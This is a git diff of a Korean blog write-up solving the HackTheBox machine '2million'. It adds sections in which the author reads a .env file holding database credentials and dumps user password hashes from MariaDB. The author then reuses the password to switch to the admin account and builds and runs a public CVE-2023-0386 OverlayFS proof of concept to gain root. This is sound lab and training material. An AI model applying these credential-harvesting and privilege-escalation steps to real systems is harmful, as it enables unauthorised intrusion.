@@ -5,6 +5,9 @@ tags: [HackTheBox]
 image:
     path: /assets/image_post/20240312190236.png
 ---
+> write-up 컨텐츠의 경우 제가 풀었던 의식의 흐름을 기억해놓고자 작성합니다. 두서 없이 정리된 만큼, 문제 풀이는 다른 분꺼 참고를 추천합니다.
+{: .prompt-tip }
+
 
 ## [0x00] port scan 
 ---
@@ -214,7 +217,6 @@ makeInviteCode를 브라우저 console에서 실행한 결과 아래와 같이 �
     "enctype": "ROT13"
   },
   "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
-}
 ```
 
 decode 결과는 아래와 같다. `/api/v1/invite/generate` API를 호출하여 invite code를 생성하라는 내용이다.
@@ -319,7 +321,7 @@ email 파라미터를 추가하여 전송하였더니...Good..👍 이제 admin�
 {"id":13,"username":"readmin","is_admin":1}
 
 ┌──(root㉿kali)-[/home/user]
-└─# curl -XGET GEttp://2million.htb/api/v1/admin/auth" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9"
+└─# curl -XGET "http://2million.htb/api/v1/admin/auth" --cookie "PHPSESSID=631oojvs6hjl3bvqmfttoiv0q9"
 {"message":true}
 ```
 
@@ -404,10 +406,8 @@ www-data@2million:~/html$
 ```
 
 
-
-
-
-```
+프로세스 목록을 보니 php가 동작하고 있다. 이와 관련해 php 설정 파일과 환경 변수를 지정하는 .env 파일을 봐야 한다.
+``` bash
 root         937       1  0 05:02 ?        00:00:00 /usr/sbin/ModemManager
 memcache    1153       1  0 05:02 ?        00:00:07 /usr/bin/memcached -m 64 -p
 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
@@ -416,8 +416,204 @@ root        1158       1  0 05:02 ?        00:00:02 php-fpm: master process (/et
 root        1178       1  0 05:02 ?        00:00:00 nginx: master process /usr/s
 ```
 
+설정 파일(php.ini)에는 별 다른 내용이 크게 존재하지는 않았다. 하지만 환경 변수 파일에는 DB admin 접속 정보가 존재하고 있다. 해당 패스워드로 sudo -s를 해보았으나 되지 않는다.
+``` bash
+www-data@2million:/etc/php/8.1/fpm$ find ~ -name '.env'
+/var/www/html/.env
+www-data@2million:/etc/php/8.1/fpm$
+www-data@2million:/etc/php/8.1/fpm$ cat /var/www/html/.env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
 
+www-data@2million:/etc/php/8.1/fpm$ sudo -s
+[sudo] password for www-data:
+Sorry, try again.
+```
 
-## [xx] conclusion
+## [0x05] login mysql
 ---
-뭔가 풀면서 억지로 이어지는 기분이 많이 든다...굳이 js
+db가 어느 port에서 동작하는지 한번 목록을 보니 높은 확률로 3306일 것 같다.
+``` bash
+www-data@2million:/etc/php/8.1/fpm$ netstat -nap
+Proto Recv-Q Send-Q Local Address           Foreign Address         State	PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN		-
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN	1189/nginx: worker
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN		-
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN		-
+tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN		-
+tcp        0      0 127.0.0.1:3306          127.0.0.1:33998         ESTABLISHED	-
+tcp        0      0 127.0.0.1:35162         127.0.0.1:11211         ESTABLISHED	-
+tcp        0      0 127.0.0.1:11211         127.0.0.1:35162         ESTABLISHED	-
+tcp        0      1 10.10.11.221:41022      8.8.8.8:53              SYN_SENT	-
+tcp        0    129 10.10.11.221:55240      10.10.14.36:443         ESTABLISHED	-
+```
+
+성공적으로 로그인된 것을 볼 수 있다. 다만, mysql 계정 권한도 root는 아니므로 추가적인 권한 상승 방법을 찾아야 한다.
+``` bash
+# login mysql
+www-data@2million:/etc/php/8.1/fpm$ mysql -h 127.0.0.1 -P 3306 -u admin -p
+Enter password:
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 62
+Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]>
+
+# mysql 권한 확인
+www-data@2million:/etc/php/8.1/fpm$ ps -ef | grep mysql
+mysql       1257       1  0 Mar28 ?        00:00:15 /usr/sbin/mariadbd
+www-data    3767    3702  0 01:54 pts/0    00:00:00 grep mysql
+```
+
+
+``` bash
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| htb_prod           |
+| information_schema |
++--------------------+
+2 rows in set (0.001 sec)
+
+MariaDB [(none)]> use htb_prod;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [htb_prod]> show tables;
++--------------------+
+| Tables_in_htb_prod |
++--------------------+
+| invite_codes       |
+| users              |
++--------------------+
+2 rows in set (0.001 sec)
+
+MariaDB [htb_prod]> select * from users;
++----+--------------+----------------------------+--------------------------------------------------------------+----------+
+| id | username     | email                      | password                                                     | is_admin |
++----+--------------+----------------------------+--------------------------------------------------------------+----------+
+| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
+| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
+| 13 | readmin      | readmin@readmin.com        | $2y$10$wUicwMenr2X1rcObbs.5F.dJalk9iZGLRxDR1iKCDX7grrLhCP5EC |        1 |
++----+--------------+----------------------------+--------------------------------------------------------------+----------+
+3 rows in set (0.001 sec)
+```
+
+admin이라는 local 계정이 실제로 있었다....여기에 로그인을 해야하는거였나...
+``` bash
+www-data@2million:~$ su admin
+Password:
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+admin@2million:/var/www$
+```
+
+
+## [0x06] mail & cve
+---
+무엇을 해야할지 더 이상 감이 안잡히는 상황에서 Guide Mode의 설명을 보니 메일과 관련된 항목을 찾아야 하는 것 같다. linpeas.sh를 통해 확인해보니 아래와 같이 mail이 있다.
+``` bash
+╔══════════╣ Mails (limit 50)
+      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/mail/admin
+      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/spool/mail/admin
+
+
+admin@2million:/tmp$ cat /var/mail/admin
+From: ch4p <ch4p@2million.htb>
+To: admin <admin@2million.htb>
+Cc: g0blin <g0blin@2million.htb>
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: <9876543210@2million.htb>
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather      
+```
+
+OverlayFS 관련 커널 관련 취약점이 있는 것으로 보인다. 검색을 해보니 cve-2023-0386과 관련된 문제 같다.
+> The OverlayFS vulnerability CVE-2023-0386: Overview, detection, and remediation
+
+github 에서 [PoC](https://github.com/sxlmnwb/CVE-2023-0386)를 갖고와 공격을 시도하였다. 아래와 같이 `./fuse ./ovlcap/lower ./gc`까지 진행된 상태면 쉘을 하나 더 연결해주어야 한다.
+``` bash
+admin@2million:/tmp/CVE-2023-0386$ ls
+exp.c  fuse.c  getshell.c  Makefile  ovlcap  README.md  test
+admin@2million:/tmp/CVE-2023-0386$ make all
+gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
+fuse.c: In function ‘read_buf_callback’:
+fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
+  106 |     printf("offset %d\n", off);
+      |                    ~^     ~~~
+      |                     |     |
+      |                     int   off_t {aka long int}
+      |                    %ld
+fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
+  107 |     printf("size %d\n", size);
+      |                  ~^     ~~~~
+      |                   |     |
+      |                   int   size_t {aka long unsigned int}
+      |                  %ld
+fuse.c: In function ‘main’:
+fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
+  214 |     while (read(fd, content + clen, 1) > 0)
+      |            ^~~~
+      |            fread
+fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
+  216 |     close(fd);
+      |     ^~~~~
+      |     pclose
+fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
+  221 |     rmdir(mount_path);
+      |     ^~~~~
+/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
+(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking gcc -o exp exp.c -lcap
+gcc -o gc getshell.c
+admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
+[+] len of gc: 0x3ee0
+```
+
+## [0x07] exploit
+---
+ssh로 shell을 하나 더 붙인 후 github 설명에 있던 바와 같이 ./exp를 실행해주면 root 권한을 획득하게 된다.
+``` bash
+┌──(root㉿kali)-[/home/user/htb]
+└─# ssh admin@10.10.11.221
+
+admin@2million:~$ cd /tmp/CVE-2023-0386/
+
+admin@2million:/tmp/CVE-2023-0386$ ls
+exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
+admin@2million:/tmp/CVE-2023-0386$ ./exp
+uid:1000 gid:1000
+[+] mount success
+total 8
+drwxrwxr-x 1 root   root     4096 Mar 29 04:08 .
+drwxr-xr-x 6 root   root     4096 Mar 29 04:08 ..
+-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
+[+] exploit success!
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+root@2million:/tmp/CVE-2023-0386# sudo whoami
+root
+```
+
+이제 모든 문제를 풀 수 있게 된다.
+
+## [0x08] conclusion
+---
+starting point가 아닌 첫 문제였는데....뭔가 풀면서 억지로 짜여진 느낌이 강하게 든다...🤔 공략을 자꾸 볼 수 밖에 없다니...다른 문제도 열심히 풀어야겠다.
+
+![](../assets/image_post/20240329131404.png)
